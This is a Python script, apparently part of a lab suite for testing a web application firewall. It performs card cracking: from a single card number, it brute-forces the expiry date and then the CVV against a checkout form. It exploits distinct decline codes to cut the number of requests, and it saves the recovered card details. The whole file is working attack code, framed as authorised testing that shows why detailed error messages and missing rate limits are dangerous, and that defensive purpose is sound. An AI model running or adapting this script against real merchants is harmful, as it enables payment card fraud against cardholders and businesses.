#!/usr/bin/env python3
"""Tier 5 -- card cracking (OAT-010).

The attacker has one PAN and none of the rest. Brute-forcing expiry and CVV
together is 48 x 1000 = 48,000 requests. But this checkout returns a different
decline code for a wrong expiry (54) than for a wrong CVV (82), which splits the
search in two: find the expiry in at most 48 requests, then the CVV in at most
1,000. Around 1,048 worst case, ~520 on average -- a 45x saving handed over by
the error messages alone.

That is the lesson of this tier: the response detail is the vulnerability. Even
with perfect rate limiting, distinguishable decline codes make the attack
tractable.

Expected result unprotected: the full card is recovered in a few minutes.
Expected result with Brute Force Prevention and URL-aware scoring: the run is
cut off long before either phase completes.

AUTHORISED LABORATORY USE ONLY. Simulates payment card fraud; run only
against systems you own or have written permission to test. See NOTICE.

Copyright 2026 Michael S Collins. Licensed under the Apache License 2.0.
"""

import itertools
import time

import requests

import labcards

MONTHS = [f"{m:02d}" for m in range(1, 13)]
YEARS = [f"{y:02d}" for y in range(26, 30)]


def submit(session, url, pan, month, year, cvv, timeout, interval=0.0):
    if interval:
        time.sleep(interval)
    response = session.post(
        url,
        data={
            "cardholder": "A Shopper",
            "card_number": pan,
            "exp_month": month,
            "exp_year": year,
            "cvv": cvv,
            "postcode": "SW1A 1AA",
        },
        timeout=timeout,
        allow_redirects=False,
    )
    return labcards.classify(response.status_code, response.text)


def find_expiry(session, url, pan, timeout, tally, interval=0.0, probe_cvv="000"):
    """Phase 1: an expiry is correct when the decline code stops being 54."""
    for year, month in itertools.product(YEARS, MONTHS):
        outcome = submit(session, url, pan, month, year, probe_cvv, timeout, interval)
        tally.add(outcome)
        if outcome == "approved":
            return month, year, probe_cvv
        if outcome == "declined:82":
            print(f"  expiry found: {month}/{year}  (code flipped 54 -> 82)")
            return month, year, None
        if outcome == "declined:05":
            print("  card is not live -- every attempt returns 05. Pick a live PAN.")
            return None, None, None
        if outcome in ("blocked", "challenge"):
            print(f"  {outcome} during expiry search -- the WAF cut the run short.")
            return None, None, None
    return None, None, None


def find_cvv(session, url, pan, month, year, timeout, tally, interval=0.0):
    """Phase 2: only the correct CVV approves."""
    for value in range(1000):
        cvv = f"{value:03d}"
        outcome = submit(session, url, pan, month, year, cvv, timeout, interval)
        tally.add(outcome)
        if outcome == "approved":
            return cvv
        if outcome in ("blocked", "challenge"):
            print(f"  {outcome} during CVV search -- the WAF cut the run short.")
            return None
    return None


def main():
    parser = labcards.base_parser(__doc__.splitlines()[0])
    parser.add_argument("--pan", required=True,
                        help="the card number to crack (expiry and CVV unknown)")
    parser.add_argument("--rate", type=float, default=0.0,
                        help="requests per second; 0 means unthrottled")
    args = parser.parse_args()
    labcards.preflight(args)

    pan = "".join(c for c in args.pan if c.isdigit())
    if not labcards.luhn_ok(pan):
        raise SystemExit(f"{pan} fails the Luhn check -- it would be rejected as code 14.")

    url = args.target.rstrip("/") + "/checkout"
    tally = labcards.Tally()
    interval = 1.0 / args.rate if args.rate > 0 else 0.0
    started = time.time()

    print(f"tier 5: cracking {pan} at {url}")
    print("  phase 1: expiry (<=48 requests)")

    with requests.Session() as session:
        month, year, cvv = find_expiry(session, url, pan, args.timeout, tally, interval)
        if not month:
            print(tally.summary(time.time() - started))
            return

        if cvv is None:
            print("  phase 2: CVV (<=1000 requests)")
            cvv = find_cvv(session, url, pan, month, year, args.timeout, tally, interval)

    if cvv:
        print(f"\n  RECOVERED  {pan}  exp {month}/{year}  cvv {cvv}")
        tally.live.append({"pan": pan, "exp_month": month, "exp_year": year, "cvv": cvv})
    else:
        print("\n  not recovered")

    print(tally.summary(time.time() - started))
    labcards.save_live(args.out, tally.live)


if __name__ == "__main__":
    main()
